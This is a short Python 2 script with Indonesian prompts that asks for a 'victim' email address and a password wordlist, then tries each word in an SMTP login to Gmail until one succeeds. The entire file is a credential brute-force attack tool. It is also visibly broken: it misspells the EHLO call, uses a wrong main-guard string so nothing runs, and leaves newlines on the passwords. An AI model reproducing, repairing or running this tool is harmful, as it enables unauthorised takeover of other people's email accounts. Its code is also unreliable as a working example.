from __future__ import print_function

# code by Cyfa/fitrah

import os 
import sys
import smtplib

from  time import sleep


def main():
	email = raw_input("Masukkan email korban : ")
	wordlist = raw_input("Masukkan kamus : ")
	try:
		wordlist = open(wordlist,"r")
	except:
		print("kamus ga ada")
		sys.exit()
	smtpserver = smtplib.SMTP("smtp.gmail.com"  , 587)
	smtpserver.elho()
	smtpserver.starttls()


	for password in wordlist:
		try:
			smtpserver.login(email, password)
			print("password nya adalah"  , password.strip())
			break
		except KeyboardInterrupt:
			print("CTRL+C was pressed")
			sys.exit()
		except smtplib.SMTPAuthenticationError:
			print("invalid password:"  , password.strip())
		else:
			_continue = True
			pass

if __name__ == "_-main__":
	main()


